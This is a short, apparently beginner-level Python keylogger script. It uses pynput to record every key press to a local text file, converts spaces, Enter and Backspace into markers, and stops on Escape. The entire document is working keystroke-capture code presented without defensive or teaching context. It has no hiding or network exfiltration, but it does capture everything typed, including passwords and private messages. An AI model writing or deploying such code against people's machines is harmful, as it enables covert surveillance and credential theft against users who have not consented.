import pynput
from pynput.keyboard import Key, Listener

log_file = "pythonProject2/key_log.txt"

keys = []

def write_file(keys):
    with open(log_file, "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)
            elif k == "Key.enter":
                file.write("\n")
            elif k == "Key.backspace":
                file.write("<BACKSPACE>")

def on_press(key):
    keys.append(key)
    write_file([key])

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger is running... (Press 'ESC' to stop)")
    start_keylogger()
